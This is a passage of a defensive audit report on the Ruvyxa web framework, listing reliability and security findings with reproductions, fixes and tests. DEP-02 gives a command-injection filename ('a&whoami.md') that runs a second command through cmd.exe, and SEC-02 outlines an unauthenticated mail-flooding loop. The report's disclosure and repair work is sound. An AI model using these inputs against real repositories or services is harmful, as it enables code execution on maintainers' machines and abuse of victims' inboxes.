- **Fix:** (1) Have `normalizeHttpRoute` refuse a path in `RESERVED_FRAMEWORK_PATHS` with the
  message `normalizeRealtime` already uses. (2) In `limitThenDispatch`, when the canonical path is
  one of `ACTION_PATH`, `FLIGHT_PATH`, `RSC_PATH`, or `/__ruvyxa/image`, call `dispatch` directly
  and skip `pluginHttp`, matching axum's ordering.
- **Regression risk:** (2) removes plugin hooks from the framework endpoints in deployed builds. Any
  project relying on a response hook to add headers there loses it — but
  `withDefaultSecurityHeaders` still runs, and the native host has never offered that coverage, so
  this converges on the documented behaviour.
- **Tests:** Extend `tests/fixtures/framework-endpoint-conformance.json` with a
  `pluginReachable: false` field per reserved endpoint and build a handler with a `pluginHttp` that
  short-circuits everything, asserting each reserved endpoint still answers from the framework. Add
  a case asserting `http.route({ path: '/__ruvyxa/action' })` throws.

### RTMS-07 — A timed-out streaming server-components document leaves the Flight payload branch reading forever

- **Category:** Reliability · **Confidence:** SPECULATIVE
- **Files:** `packages/ruvyxa/runtime/server-components.mjs:171`;
  `packages/ruvyxa/runtime/worker-pool.mjs:503`, `:2551`
- **Evidence:** `const [forHtml, forPayload] = flight.tee()` produces two branches; the code owns
  only one past the happy path. `emitApiStream`'s `catch` cancels the HTML branch's reader and
  returns; nothing cancels `forPayload`, and `streamTrailer` — the only awaiter of
  `rendered.payload` — is reached only from `endFrame()`. The worker registers no
  `unhandledRejection` handler.
- **Reproduction:** Drive `handleServerComponentsDocument` with a server component that suspends
  past `RUVYXA_WORKER_TIMEOUT_MS`, then assert the worker survives and the `forPayload` reader is
  settled. If React's `renderToReadableStream` always closes its stream on `onError` rather than
  erroring it, the unhandled-rejection half is dead and only the retention half stands.
- **Root cause:** `tee()` produces two independent branches and only one has an owner on the error
  path.
- **Impact:** Each timed-out streaming RSC document retains the in-progress React render, the
  un-cancelled tee branch, and the partially accumulated payload string for the life of the worker.
  Under a route that reliably times out that is per-request heap growth in a long-lived
  `ruvyxa start` worker — precisely the growth `registeredModuleUrls` reporting was added to make
  measurable, and this source would not show up there. If the branch can reject rather than hang,
  the worker dies with an unhandled rejection instead.
- **Fix:** Give the payload promise an owner in every outcome: attach a `.catch()` (logging through
  the existing `note('error', …)` path, not discarding) before returning it, and return the
  `forPayload` reader or a `cancel()` thunk alongside it, called from `emitApiStream`'s `catch` next
  to `reader.cancel(error)`.
- **Regression risk:** A swallowed rejection is a hidden failure, so the `.catch()` must log.
  Cancelling the payload branch on the error path is safe because the response is already lost.
- **Tests:** An `rscDocument` request whose render never completes with a low timeout; assert an
  `api-error` frame is emitted, the worker answers a subsequent `ping`, and the Flight source
  observed a cancel.

## `@ruvyxa/core`, react, testing

### CORE-03 — `resolveStaticFile` has no `.webp` → `.png/.jpg` fallback, so `<Image>` 404s on self-hosted builds with `image.optimize: false`

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/@ruvyxa/core/src/standalone-server.ts:181`;
  `packages/@ruvyxa/react/src/image.tsx:165-170`;
  `crates/ruvyxa_dev_server/src/static_assets.rs:696-712`;
  `crates/ruvyxa_cli/src/image_optimizer.rs:384`
- **Evidence:** The emitted server resolves only PNG/JPEG → WebP, and its comment claims parity with
  `resolve_public_asset`. The Rust resolver mirrors **both** directions, and the missing one is the
  one it documents as load-bearing. `<Image>` rewrites to `webpUrl(src)` unconditionally — it has no
  access to `image.optimize` — and `image.optimize: false` publishes the source untouched with no
  `.webp` beside it.
- **Reproduction:** `image: { optimize: false }` with `<Image src="/logo.png" … />`. `ruvyxa start`
  serves it; the emitted node/bun/deno server 404s it.
- **Root cause:** `resolve_public_asset` answers two questions and only the first was ported. The
  gate has the same asymmetry: the conformance suite tests the ported direction and never the
  missing one, so a fixture that looks like it covers image fallback covers exactly half of it.
- **Impact:** Every `<Image>` on the page renders broken, on every self-hosted deployment of a
  project that turned image optimization off or whose sources the optimizer skipped
  (`is_optimizable_source` false, or an undecodable header — both fall through the same `copy_asset`
  branch). Invisible locally, because `dev` and `start` both resolve it. The same URLs also 404 from
  a CDN publish directory for the four serverless adapters.
- **Fix:** Add the reverse candidate: when `resolved` ends in `.webp`, push `.png`, `.jpg`, `.jpeg`
  siblings. Match the Rust guard's "exactly one candidate" rule so an ambiguous `logo.png` +
  `logo.jpg` pair resolves to neither — the current first-hit loop would otherwise make the two
  hosts disagree on the ambiguous case even after the fix.
- **Regression risk:** Low; it only adds resolutions for URLs that currently 404. The "exactly one"
  rule must be honoured or a project with both siblings gets an answer that depends on array order.
- **Tests:** Beside "answers a PNG URL with the WebP the build published", add "answers a WebP URL
  with the source the build left untouched" (stage `public/source.png`, assert `GET /source.webp` is
  200 with `content-type: image/png`), and a second case staging both siblings asserting a 404.

### CORE-04 — `createPluginHarness` accepts plugin registrations the framework refuses to boot with, and matches on the undecoded pathname

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/@ruvyxa/core/src/plugin-harness.ts:168`, `:241`, `:375`, `:390`;
  `packages/ruvyxa/runtime/plugin-http.mjs:99`, `:156`, `:400`, `:501`, `:544`
- **Evidence:** The harness's registration step is a bare call that records into arrays. The
  production registry rejects, at construction, nine things the harness accepts: a duplicate plugin
  name; an `error`-level diagnostic; a route path that is not an exact absolute path; an invalid
  HTTP method token; two plugins claiming one route; a `match` that is empty, not an array, not
  leading-`/`, or wildcard-not-at-end; an unknown or doubly-claimed native capability; a hook
  returning something that is neither `Response`/`Request`/`undefined`; and `next()` called with the
  wrong type. Two behavioural divergences on top: production matches the **decoded** pathname and
  the harness the raw one, and production dispatches routes and `onRequest` hooks from **one
  registration-ordered list** while the harness keeps two arrays reached by two methods, so that
  ordering can never be observed. `matchesAny` is also a second hand-written port of
  `matchesPatterns` — byte-identical today.
- **Reproduction:** A plugin with `http: { match: ['/api/*/items'], onRequest: … }` and a passing
  harness test. `ruvyxa dev` then refuses to start. Or a `level: 'error'` diagnostic — green in the
  harness, `TypeError` at boot.
- **Root cause:** The harness re-implements the registration API rather than reusing
  `createPluginRegistry`/`dispatchPluginRequest`. It cannot import them today: `@ruvyxa/core` does
  not depend on `ruvyxa` (the dependency runs the other way), so the harness grew its own recording
  sockets and, with them, its own — absent — contract.
- **Impact:** The documented way to unit-test a Ruvyxa plugin reports success for plugins the
  framework will not start with, and for match patterns that behave differently in production. A
  plugin author's whole suite can be green while `ruvyxa dev` fails at startup — the failure mode
  the harness exists to prevent.
- **Fix:** Move the normalisers (`normalizeHttpHook`, `normalizeHttpRoute`, `normalizePatterns`,
  `normalizeDiagnostic`, `matchesPatterns`, `decodedRequestPathname`) into `@ruvyxa/core` and have
  `plugin-http.mjs` import them the way `runtime/origin-policy.mjs` and `runtime/route-match.mjs`
  already import theirs — the generated-copy mechanism in
  `packages/ruvyxa/scripts/sync-shared-runtime.mjs` exists for exactly this and is `--check`-gated.
  That deletes `matchesAny` and single-sources the rule. Failing that: throw on duplicate names and
  error diagnostics, run `match`/`path`/`method` through the same predicates, match on
  `decodeURIComponent(pathname)`, and merge routes and hooks into one ordered list.
- **Regression risk:** Existing plugin suites that register an invalid pattern or an error
  diagnostic start failing — the point, but a breaking change to a published surface belonging in a
  minor release. Moving the normalisers must keep them dependency-free and free of `node:` imports,
  since the generated copy is inlined into serverless bundles.
- **Tests:** Cases asserting the harness _rejects_ each of the nine, plus one asserting
  `harness.request('/files/my%20doc')` runs a hook declared as `match: ['/files/my doc']`. Best: a
  table replayed by both `plugin-harness.test.ts` and `plugins.test.mjs`.

### CORE-05 — The Node transport buffers every request body ahead of admission control and ahead of the endpoint's smaller limit

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/@ruvyxa/core/src/standalone-server.ts:854`, `:904`, `:966`, `:1454`
- **Evidence:** `requestInit.body = await readRequestBody(req)` runs **before** `handleAdmitted`, so
  `MAX_CONCURRENT_RENDERS`/`MAX_QUEUED_RENDERS` — added specifically to stop "a burst larger than
  the machine turned into a heap holding every in-flight render at once" — does not bound it. The
  other two transports do not buffer at all, and the file says so at `:1454`.
- **Reproduction:** Run the emitted Node server with `RUVYXA_MAX_CONCURRENCY=2 RUVYXA_MAX_QUEUE=2`
  and open 200 concurrent `POST /__ruvyxa/action` requests each streaming 9 MiB with no
  `content-length`. All 200 bodies are read into `Buffer`s before any reaches admission. The same
  200 against the Bun or Deno build are refused with 503 after four, each body bounded by
  `limitBodyStream` at the _action_ limit of 1 MiB.
- **Root cause:** The Node transport enforces one global cap because `node:http` hands it a stream
  and `new Request` needs a body. But the framework's real policy is per-endpoint —
  `security.actionLimit` defaults to 1 MiB and `/__ruvyxa/rsc` is capped at 4 MiB — and those checks
  live inside `createHandler`, which cannot run until the body is already in memory.
- **Impact:** A memory-amplification asymmetry between the three runtimes of one build: the Node
  deployment can be pushed to an out-of-memory kill by concurrent uploads that the Bun and Deno
  deployments of the same artifact refuse. It is the exact failure the admission controller was
  added for, on the path it does not cover, on the default runtime.
- **Fix:** Acquire the admission slot (or refuse with `overloaded()`) **before** `readRequestBody`,
  passing the already-admitted request into a `handleWithTimeout` that does not re-acquire. The
  cheaper half: reject on the declared `content-length` before reading a byte, and compute
  `REQUEST_BODY_LIMIT` as `Math.max(apiLimit, actionLimit, 4 MiB)` so the transport's cap derives
  from the same policy.
- **Regression risk:** A plugin-owned POST route would queue behind renders, and a 503 for an upload
  means the caller is refused before sending rather than after — both correct, but observable timing
  changes. The drain path would then refuse uploads earlier during a shutdown window.
- **Tests:** Park every slot with the hanging route, send a POST with a large body, and assert it is
  answered 503 **without** the body having been read. Add a body-limit case for all three runtimes —
  the existing suite never sends a request body at all, which is why this is invisible.

### CORE-06 — The standalone server compresses `text/event-stream`; the Axum host excludes it

- **Category:** Reliability · **Confidence:** CONFIRMED (decision path; the framing consequence is
  measured behaviour of zlib/`CompressionStream` rather than something executed here)
- **Files:** `packages/@ruvyxa/core/src/standalone-server.ts:291`, `:345`, `:1032`, `:1424`
- **Evidence:** `COMPRESSIBLE_TYPE` begins `^(?:text\/|…)`, which matches `text/event-stream`, and
  the size floor is explicitly waived for a body with no declared length — "a streamed response has
  no declared length and is always compressed, because there is nothing to compare" — which is
  exactly what an SSE response is. Node then inserts a default-flush `createGzip()` and Bun/Deno a
  `new CompressionStream(encoding)`; neither flushes per chunk. The Axum host reaches the opposite
  decision: tower-http 0.7's `DefaultPredicate` excludes `text/event-stream`, and its own
  `CompleteBodyCompressionPredicate` additionally requires an exact `size_hint`.
- **Reproduction:** An API route returning
  `new Response(stream, { headers: { 'content-type': 'text/event-stream' } })`. Under `ruvyxa start`
  events arrive as produced; against the emitted standalone server with `Accept-Encoding: gzip`,
  `EventSource` receives nothing until roughly 16 KB has accumulated in the encoder or the stream
  ends.
- **Root cause:** The compressible-type list is an allow-list written as a prefix regex, and
  `^text\/` swallows the one text type that must never be buffered. The size floor that would
  otherwise have caught a trickle of small writes is deliberately waived for length-less bodies, on
  reasoning true of the two cases the author had in mind and not of the third.
- **Impact:** Server-sent events are unusable on every self-hosted deployment while working under
  `dev`/`start`; the symptom is a stream that appears to hang. Nothing in the repository uses
  `text/event-stream` today, so this is latent rather than firing — but it is reachable by any
  application API route and it is a silent dev/prod divergence. Secondary: _any_ streamed
  compressible response is compressed regardless of size, so a 20-byte streamed `text/plain` body
  pays a gzip header larger than itself.
- **Fix:** Add an explicit `NON_COMPRESSIBLE_TYPE` refusal ahead of the allow-list inside
  `isCompressibleType` — for `text/event-stream` and, matching tower-http, `application/grpc`. Do it
  inside `isCompressibleType` rather than `compressionFor` so the `Vary: accept-encoding` derived
  from the same predicate is suppressed with it. While there, honour `Cache-Control: no-transform`.
- **Regression risk:** None for the SSE case, which is broken now. Refusing on `no-transform` stops
  compressing any document whose route sets it — the documented meaning of the header, but a visible
  byte-size change for a project that set it for other reasons.
- **Tests:** Assert the refusal list is present in the emitted source; add a stub route returning a
  `text/event-stream` response that writes one small chunk and stays open, asserting for all three
  runtimes that the first chunk is readable within a short deadline and that the response carries no
  `content-encoding` and no `vary: accept-encoding`.

### CORE-07 — `mockCache` accepts durations, tags, scopes, keys, and values that the real `cache()` rejects

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/@ruvyxa/testing/src/index.ts:106`, `:114`, `:132`;
  `packages/@ruvyxa/core/src/server.ts:341`, `:381`, `:398`, `:437`, `:470`
- **Evidence:** Every builder method on the double is a plain assignment. The real builder validates
  and throws on: a key that is not a string of ≤ 8192 chars; a `ttl`/`swr` not matching
  `/^(\d+)\s*(ms|s|m|h|d)$/`; more than 32 tags or a tag outside `/^[A-Za-z0-9:._/-]{1,128}$/`; a
  `scope` other than `'deployment'`/`'request'`; `scope('request')` outside a request; a value that
  is not a JSON-shaped tree (`RUV1841`); and a shared-scope producer that read cookies, headers, or
  draft state (`RUV1840`).
- **Reproduction:** A loader written as
  `cache('posts').ttl('5 minutes').get(async () => ({ published: new Date() }))` with a
  `mockCache()` test. The test passes and asserts the returned `Date`. In production the same code
  throws `Invalid cache duration "5 minutes"` at the first call, and — had the duration been valid —
  `RUV1841` after the producer returned.
- **Root cause:** The double reimplements `CacheBuilder`'s _shape_ (which the TypeScript interface
  pins) without its _contract_ (which lives entirely in runtime throws the interface cannot
  express). The one place the file does copy a rule, it says so in a comment — showing the intent
  was parity.
- **Impact:** The "test helper that silently passes on a failure" case. `@ruvyxa/testing` exists to
  let a loader or action be exercised without a server, and the class of bug it is least able to
  catch — an unserializable cached value, an invalid duration, a shared-scope producer reading
  cookies — is precisely the class that only ever fails in production, at the first request, with an
  `RUV18xx` the author has never seen. The privacy check is the worst: it exists to stop one
  visitor's data being served to another from a shared cache, and a suite built on `mockCache` will
  never exercise it.
- **Fix:** Export `parseTtl`, `validateCacheTag`, and `assertCacheSerializable` from
  `@ruvyxa/core/server` — they are already standalone functions — and call them from `mockCache`'s
  `ttl`, `swr`, `tags`, and `get`. Enforce the key-length check, reject a `scope` outside the two
  literals, and make `scope('request')` optionally throw when the double was not given a request
  context. Note the ordering the real one uses: `assertSharedCachePrivacy()` runs _after_
  `await producer()`, so a double that checks earlier would diverge in the other direction.
- **Regression risk:** Existing application suites that pass an invalid duration or cache a `Date`
  start failing — the point, but a behaviour change in a published test helper belonging in a minor
  release. Exporting the validators widens `@ruvyxa/core/server`'s public surface; they could be
  exported from a non-`index` entry point instead.
- **Tests:** Cases asserting the double throws for `ttl('5 minutes')`, `tags('a b')`, 33 tags,
  `scope('global')`, an over-length key, and `get(() => new Date())`. Better: a shared table
  replayed by both `testing.test.mjs` and `tests/packages/core/server.test.ts`.

## auth, database, realtime, plugins

### SEC-02 — No rate-limit dimension caps a single identity globally, making `magic-link` an unauthenticated outbound-mail amplifier

- **Category:** Security · **Confidence:** CONFIRMED
- **Files:** `packages/@ruvyxa/auth/src/index.ts:426-441`, `:296-322`, `:424-426`
- **Evidence:** Two buckets, `${scope}:${clientKey}` and `clientKey` — the comment calls the first
  "per-identity" but it is keyed identity **and** client. There is no bucket keyed by identity
  alone. `clientKey` itself falls back to a client-chosen value whenever no resolver is configured:
  `clientIp ?? \`ua:${request.headers.get('user-agent')?.slice(0, 128) ??
  'unknown'}\``. `startMagicLink` sends mail through the same generic budget and deliberately sends
  before any user exists, so as not to leak enumeration.
- **Reproduction:** With the default configuration (`clientIp` unset), POST
  `/__ruvyxa/auth/magic-link` with one victim address in a loop while rotating the `User-Agent`;
  every request passes both buckets and sends an email. With `clientIp` wired, the same loop from N
  source addresses yields `N × rateLimitMax` emails to one address per window.
- **Root cause:** Bucket key composition. `consumeRateLimit` folds the client into _both_ buckets,
  so the only unbounded axis — one identity, many clients — has no ceiling. The `clientIp` fallback
  weakness is acknowledged in a docstring; the missing global per-identity cap is not, and the
  comment states a property the code does not have.
- **Impact:** (a) With the default config an unauthenticated attacker makes the application send
  unlimited mail to arbitrary addresses — sender-reputation damage, provider quota exhaustion,
  direct cost. (b) Even with `clientIp` wired, a botnet gets an unthrottled per-account credential
  budget, which is the case the second bucket was added to close.
- **Fix:** Add a third bucket keyed on the scope alone — `tokenKey('rate-identity', scope, …)` —
  with a generous multiplier so a real user on a shared egress is unaffected while an account cannot
  be swept from arbitrarily many sources. Give `startMagicLink` its own tighter budget than a login
  attempt, and consider making `clientIp` required when a `magic-link` provider is configured.
- **Regression risk:** A per-identity global bucket is a lockout primitive — an attacker can burn
  one account's budget to deny sign-in. Keep its ceiling well above the per-client one, window it
  short, and do not apply it to the client-only bucket.
- **Tests:** A case rotating `x-test-ip` across N values against one email, asserting a 429 arrives
  before `N × max` attempts. The existing "caps how many identities one client may attempt" test
  covers the transposed case only.

### SEC-03 — `healthCheck()` echoes the raw exception message to an unauthenticated public endpoint

- **Category:** Security · **Confidence:** CONFIRMED
- **Files:** `packages/ruvyxa/src/plugins/http.ts:823-836`, `:839-851`
- **Evidence:** The catch returns
  `{ status: 'error', error: error instanceof Error ? error.message : String(error) }` and
  `healthResponse` writes the object straight into the body. The route is registered with no
  authentication and no origin guard.
- **Gate check:** `tests/packages/ruvyxa/plugins.test.mjs:1507-1521` **asserts this behaviour**
  (`assert.deepEqual(await response.json(), { status: 'error', error: 'database unreachable' })`),
  so the existing test codifies the disclosure rather than catching it.
- **Reproduction:** `healthCheck({ check: () => db.$connect() })` against an unreachable database,
  then `curl https://app.example.com/health`. The driver's message — for `pg`,
  `connect ECONNREFUSED 10.0.0.5:5432`; for Prisma, the host, port, and database — is returned
  verbatim to any anonymous caller.
- **Root cause:** The failure path treats the check's exception text as a health signal rather than
  internal diagnostic data. `/health` is by definition reachable without credentials, so anything it
  says is public.
- **Impact:** An anonymous attacker probing `/health` while a dependency is degraded learns internal
  hostnames, private IPs, ports, database names, and — for drivers that include them —
  authentication-failure detail. A free internal-topology map at exactly the moment the system is
  under stress.
- **Fix:** Return a fixed body (`{ status: 'error' }`) by default and route the real error to the
  plugin's diagnostics/logger. Add an explicit `healthCheck({ exposeErrors: true })` opt-in, and say
  in the JSDoc that it must not be enabled on an internet-reachable path.
- **Regression risk:** Operators who currently read the message from `/health` lose it; the
  replacement has to actually log it somewhere they can reach, or debugging gets worse.
- **Tests:** Update the existing test to assert the message is **absent** by default and present
  only under `exposeErrors: true`.

### SEC-04 — The PWA service worker's cache identity is a hand-maintained `v1` stamp, so an unfingerprinted asset is served stale forever

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/ruvyxa/src/plugins/pwa.ts:115-121`, `:56-58`, `:210-214`, `:226-236`
- **Evidence:** The cache name is `${cachePrefix}${options.version ?? 'v1'}` where `cachePrefix`
  hashes only the _scope_ — fixed configuration. Nothing build-derived feeds it. The generated
  worker is cache-first with no revalidation and no expiry for `font`, `image`, `script`, `style`,
  and `activate` deletes only caches sharing the prefix whose name **differs** — so with the default
  the old cache is never a different name and is never dropped.
- **Gate check:** the plugin test asserts `/ruvyxa-pwa-[0-9a-f]{12}-v1/`, pinning the stamp in place
  rather than rejecting it.
- **Reproduction:** A `pwa()` project shipping an unhashed `/logo.png` or `/vendor.js`; load once,
  change the file, redeploy without touching `version`, reload. The browser serves the original
  bytes indefinitely.
- **Root cause:** The repository's named trap #4 — cache identity must derive from real inputs,
  never from a stamp somebody has to remember to bump. Here the stamp _is_ the reuse decision, and
  forgetting is silent. Fingerprinted output is unaffected (new URL, new entry), which is exactly
  why the failure only shows up on the assets nobody fingerprints.
- **Impact:** A shipped fix to any unfingerprinted script, style, image, or font never reaches a
  returning visitor who installed the service worker, with no error and no user-visible cause. For a
  script that is permanently stale application behaviour on that device.
- **Fix:** Derive the cache suffix from real inputs — hash
  `scope + precache + offlineFallback + the build's own fingerprint/manifest id` (available on
  `PluginBuildContext` at `build.onComplete`) — so a new build is a new cache name automatically.
  Keep `options.version` as an override, not as the default mechanism. Alternatively switch the
  runtime cache to stale-while-revalidate so a stale entry self-heals.
- **Regression risk:** A per-build cache name discards the runtime cache on every deploy, costing
  one cold fetch per asset after each release — the correct trade against permanent staleness, but
  it changes offline-after-deploy behaviour and should be stated in the JSDoc. The `http.onRequest`
  path serves `/sw.js` from a constant computed at plugin construction, so a build-derived suffix
  needs threading to both the dev handler and the build writer.
- **Tests:** Replace the `-v1` regex assertion with one that builds twice against different
  manifests and asserts the two `CACHE` names differ.

### SEC-05 — `contentEngine` re-walks and re-stats the whole content tree on every request, in production

- **Category:** Performance / Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/ruvyxa/src/plugins/content-engine.ts:150-163`, `:174-189`, `:492-523`
- **Evidence:** `developmentArtifacts` calls `contentPageFiles` (a full recursive `readdirSync`
  walk) and `contentFilesFingerprint` (one `statSync` per discovered file) to compute the key its
  own cache is checked against. The `http.onRequest` registration that calls it has **no**
  `environment === 'development'` guard, unlike `feed()` and `searchIndex()`, which both have one.
- **Reproduction:** `ruvyxa build && ruvyxa start` on a project with `content: true` and a few
  hundred `page.md` files, then hit `/sitemap.xml` repeatedly and observe one recursive directory
  walk plus one `stat` per content page per request.
- **Root cause:** The helper is named and reasoned about as development-only but the registration
  that calls it is unguarded, so it also runs in `ruvyxa start` and in any deployed host that ships
  the app sources. The fingerprint cache avoids re-deriving the artifacts but not the walk that
  computes the fingerprint.
- **Impact:** `/sitemap.xml`, `/rss.xml`, `/content.json`, `/search-index.json`, and `/llms.txt` are
  exactly the paths crawlers poll, and `cache-control: no-cache` means no CDN absorbs them. A crawl
  turns into an N+1 `stat` storm against the origin. Secondarily, this is two sources of truth: the
  built artifact under `assets/` is shadowed by a live re-derivation from source, so if the source
  tree drifts after the build the served bytes silently stop matching what was built and
  prerendered.
- **Fix:** Take `environment` from the register context and register the handler only when it is
  `'development'`, matching `feed()` and `searchIndex()`. If it must stay for `start`, gate the
  fingerprint walk behind a short time-based debounce instead of per request.
- **Regression risk:** A self-hosted `start` deployment that today gets live content updates without
  a rebuild stops doing so — the same trade `feed()` and `searchIndex()` already made deliberately,
  but a behaviour change belonging in the changelog.
- **Tests:** Register `contentEngine` with `environment: 'production'` and assert no middleware is
  registered — the mirror of the existing `feed()`/`searchIndex()` environment cases.

### SEC-06 — `createCollabClient().setState()` silently discards every write made while the socket is not open

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/@ruvyxa/realtime/src/collab.ts:188-195`, `:364-370`;
  `packages/@ruvyxa/realtime/src/react.ts:108-123`
- **Evidence:** `send` returns `false` when `socket.readyState !== 1`; `setState` discards that
  boolean. There is no queue, no local optimistic apply, and no `fail(...)` call — the `onError`
  channel exists and is not used here. The contrast with presence is deliberate and documented:
  `localPresence` is retained across reconnects and republished, and `setPresence` echoes locally
  before the round trip. `setState` does neither, and `useSharedState` reads its value only from
  `room.state[key]`, populated exclusively by server frames.
- **Gate check:** the collab suite covers `setState` only while connected; the "stops reconnecting
  once closed" case never calls it. No test exercises a write during a disconnect.
- **Reproduction:** Mount `<CollabProvider>`, emit `close` on the injected socket, call the setter
  from `useSharedState('title', '')`, then let the reconnect succeed. The value never reaches the
  server, the component never re-renders, and no error listener fires.
- **Root cause:** The client is explicitly built to survive drops (backoff reconnect, generation
  guards, presence republish), but the shared-state write path has no equivalent story for the
  window between `close` and the next `welcome`.
- **Impact:** Silent data loss in a collaborative-editing client, at precisely the moment a user is
  least likely to notice — a transient network blip. Because the React binding renders from server
  state only, the user's keystroke visibly reverts with no signal at all.
- **Fix:** Hold last-writer-wins pending entries in a bounded `Map`, flush them from the `welcome`
  handler alongside the existing presence republish, and call `fail('...')` when the pending map
  overflows. At minimum, return `send`'s boolean from `setState` so a caller can react.
- **Regression risk:** Replaying buffered writes after a reconnect changes convergence: a write
  authored before the drop now lands _after_ whatever peers wrote during it — still
  last-writer-wins, but with a different winner than today's "the write never happened". The pending
  map must be bounded or a long disconnect becomes a memory leak.
- **Tests:** Close the socket, call `setState`, reconnect with a fresh `welcome`, and assert the
  write appears in the frames sent on the new socket (or that `onError` fired).

### SEC-07 — `fonts()` performs build-time network fetches with no timeout and no response size limit

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/ruvyxa/src/plugins/build.ts:230-240`, `:277-291`
- **Evidence:** Neither `fetch` call passes a `signal`, and neither bounds the body before
  `response.text()` / `response.arrayBuffer()`. `@ruvyxa/auth` gets this right with a
  `fetchWithTimeout` and a 10 s `AbortController` — though even there the body is unbounded.
- **Reproduction:** Point `fonts({ google: [...] })` at a host that accepts the connection and never
  responds (or run the build behind a captive portal that black-holes TLS) and observe
  `ruvyxa build` hang with no diagnostic until the CI job's own timeout kills it.
- **Root cause:** The plugin's error story is "a failure is reported as a warning and the build
  continues" — the right design, but it only handles a fetch that _fails_. A fetch that neither
  succeeds nor fails is not covered, and the warning path is never reached. The unbounded body is
  the second half: a mis-resolved host serving a multi-gigabyte response is buffered whole into a
  `Buffer` before anything checks it.
- **Impact:** A build that hangs indefinitely rather than degrading to the documented fallback
  stylesheet. In CI that is a burned runner slot and a job that fails on wall-clock with no useful
  message; locally a `ruvyxa build` that never returns. Both are the outcome the fail-soft design
  was written to avoid.
- **Fix:** Wrap both fetches with an `AbortController` on a bounded timeout (copy the auth package's
  pattern) and cap the downloaded bytes — check `content-length` and stop reading past a ceiling (a
  few MiB is generous for a `.woff2`). An abort then lands in the existing `catch` and produces the
  `RUV2103` warning plus the fallback stylesheet, which is already correct.
- **Regression risk:** A slow-but-working connection could now time out and silently degrade to
  fallback fonts. Choose the ceiling generously (30 s or more) and name the timeout in the `RUV2103`
  message so the cause is visible.
- **Tests:** A `fonts()` case with an injected fetch that never settles, asserting the build
  completes, `RUV2103` is reported, and the fallback stylesheet is written.

## Deploy adapters

### ADP-03 — Vercel picks an ISR expansion's parent route by first match over raw manifest order

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `packages/@ruvyxa/adapter-vercel/src/index.ts:433-485`, `:640-652`
- **Evidence:** `revalidateOf` is built from **every** route — API routes and non-ISR pages included
  — so `find` can match a dynamic route that is not the ISR one the expansion came from; `find`
  takes the **first** entry in manifest order, which is not the router's precedence order; and the
  comment's premise ("the only route it can have come from is the one whose pattern it fills") is
  false whenever two patterns can fill one path, which `routeSourcePattern` makes easy — `[...slug]`
  compiles to `/.+` and `[[...slug]]` to `(?:/.*)?`. The chosen value becomes the Prerender
  Function's `expiration`.
- **Reproduction:** An app with `/[...all]/page.tsx` (`revalidate = 3600`) declared before
  `/blog/[slug]/page.tsx` (`revalidate = 60`), both ISR, with `getStaticParams` expansions under
  `/blog/`. Read `.vercel/output/functions/blog/<slug>.prerender-config.json`: `expiration` is 3600.
- **Root cause:** The adapter re-derives route matching by hand instead of reusing the one matcher
  the framework already has — the "one source scanner per language" rule applied to route precedence
  rather than to bytes.
- **Impact:** A Prerender Function caches at the wrong edge window. Too long and the page is stale
  for up to the wrong route's `revalidate` with no way for a visitor to tell; too short and every
  expansion pays for a re-render it did not ask for. Silent in both directions — the page renders
  correctly and the status is 200; the only symptom is timing. Only affects apps whose dynamic route
  patterns overlap, which is exactly the shape a catch-all creates.
- **Fix:** Restrict the candidate set to `kind === 'page' && strategy === 'isr'` before matching and
  resolve the parent through the shared matcher (`@ruvyxa/core/route-match`) rather than
  `matchesPattern`/`routeSourcePattern`. Precompile one `RegExp` per pattern outside the expansion
  loop — the current form compiles one regex per (expansion × dynamic route) pair and rebuilds
  `[...revalidateOf.keys()]` per expansion.
- **Regression risk:** If an expansion's true parent is not in the narrowed candidate set, the path
  falls to the `?? 60` default instead of inheriting a longer window — shortening the cache, the
  safe direction. `routeSourcePattern` is also used for `edgeConfigRoutes`; do not change it there.
- **Tests:** Under `describe('vercel prerender functions')`, two overlapping dynamic ISR routes with
  different `revalidate` values, asserting each expansion gets its own route's window regardless of
  manifest order.

## Dependencies, scripts, CI

### DEP-02 — `format-staged.mjs` runs staged filenames through `cmd.exe` unescaped

- **Category:** Security · **Confidence:** CONFIRMED
- **Files:** `scripts/format-staged.mjs:3-6`, `:44-51`; `.githooks/pre-commit:3`
- **Evidence:** `shell: process.platform === 'win32'` with an argv array. With `shell: true` on
  win32, Node joins `[file, ...args]` with a single space and hands the result to
  `cmd.exe /d /s /c "<joined>"` with `windowsVerbatimArguments = true` — no quoting, no escaping.
  `prettierFiles` comes from `git diff --cached --name-only`.
- **Reproduction:** On Windows, add a file named `docs/my notes.md` — prettier receives two paths
  and the hook fails on a file that does not exist. For the injection: add a file named
  `a&whoami.md`, `git add`, `git commit`; `cmd.exe` splits on `&` and runs `whoami`.
- **Root cause:** `shell: true` was added so `pnpm`/`cargo` resolve through PATHEXT on Windows. That
  is a _command-resolution_ problem, and enabling the shell to solve it also puts every argument
  through `cmd.exe`'s parser. `pack-smoke.mjs` and `test-package.mjs` both already solve the same
  PATHEXT problem correctly, by locating the real JS entrypoint and spawning `process.execPath`.
- **Impact:** Anyone on Windows who ran `pnpm install` has `core.hooksPath=.githooks` configured, so
  the hook runs on every commit. A maintainer reviewing a contributed branch that adds a hostile
  filename gets arbitrary command execution on `git commit`. The mundane version — a repository path
  containing a space — breaks the hook for everyone on Windows.
- **Fix:** Drop `shell` entirely and resolve the binaries the way `pack-smoke.mjs` does: spawn
  `process.execPath` against Corepack's `pnpm.js`, and `spawnSync('git', args)` without a shell.
  Keep an argv array so no string is ever parsed.
- **Regression risk:** A standalone (non-Corepack) `pnpm` install has no Corepack path;
  `pack-smoke.mjs` already asserts on that with a clear message — copy the assertion rather than
  silently falling back.
- **Tests:** A test invoking the staged-file argv construction with a path containing a space and
  one containing `&`, asserting the spawned argv is an array with those exact members. Requires
  factoring the argv build out of the top-level script body.

### DEP-03 — The five-platform CI matrix does not gate the release; `verify-release` is a Linux-only subset

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `.github/workflows/release.yml:56-99`; `.github/workflows/ci.yml:8-11`;
  `crates/ruvyxa_cli/tests/ci_workflows.rs:217-250`
